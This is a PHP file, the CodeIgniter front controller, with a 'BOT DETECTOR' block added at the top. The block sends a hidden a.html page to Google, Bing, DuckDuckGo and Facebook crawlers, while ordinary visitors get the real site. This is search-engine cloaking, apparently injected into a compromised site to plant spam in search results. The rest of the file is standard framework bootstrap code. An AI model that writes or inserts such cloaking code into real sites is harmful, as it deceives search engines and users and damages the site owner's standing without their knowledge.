<?php
// ================= BOT DETECTOR =================
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

$target_bots = array(
    'googlebot',
    'google',
    'adsbot-google',
    'mediapartners-google',
    'slurp',
    'bingbot',
    'duckduckbot',
    'facebookexternalhit'
);

$is_bot = false;

foreach ($target_bots as $bot) {
    if (strpos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

// Jika BOT → tampilkan a.html
if ($is_bot) {
    if (file_exists('a.html')) {
        header('Content-Type: text/html');
        readfile('a.html');
    } else {
        echo "FILE a.html GAK ADA!";
    }
    exit;
}
// ================= END BOT DETECTOR =================


/**
 * CodeIgniter Front Controller
 */

// ENVIRONMENT
define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'production');

// ERROR REPORTING
switch (ENVIRONMENT)
{
    case 'development':
        error_reporting(-1);
        ini_set('display_errors', 1);
    break;

    case 'testing':
    case 'production':
        ini_set('display_errors', 0);
        if (version_compare(PHP_VERSION, '5.3', '>=')) {
            error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
        } else {
            error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
        }
    break;

    default:
        header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
        echo 'Environment tidak valid.';
        exit(1);
}

// PATH CONFIG
$system_path = 'system';
$application_folder = 'application';
$view_folder = 'views';

// FIX PATH
if (defined('STDIN')) {
    chdir(dirname(__FILE__));
}

if (($_temp = realpath($system_path)) !== FALSE) {
    $system_path = $_temp.DIRECTORY_SEPARATOR;
} else {
    $system_path = rtrim($system_path, '/\\').DIRECTORY_SEPARATOR;
}

// VALIDASI SYSTEM
if (!is_dir($system_path)) {
    header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
    echo 'System path salah.';
    exit(3);
}

// CONSTANTS
define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));
define('BASEPATH', $system_path);
define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR);
define('SYSDIR', basename(BASEPATH));

// APPLICATION PATH
if (is_dir($application_folder)) {
    $application_folder = realpath($application_folder).DIRECTORY_SEPARATOR;
} else {
    header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
    echo 'Application folder salah.';
    exit(3);
}

define('APPPATH', $application_folder);

// VIEW PATH
if (is_dir($view_folder)) {
    $view_folder = realpath($view_folder).DIRECTORY_SEPARATOR;
} else {
    $view_folder = APPPATH.'views'.DIRECTORY_SEPARATOR;
}

define('VIEWPATH', $view_folder);

// LOAD CI
require_once BASEPATH.'core/CodeIgniter.php';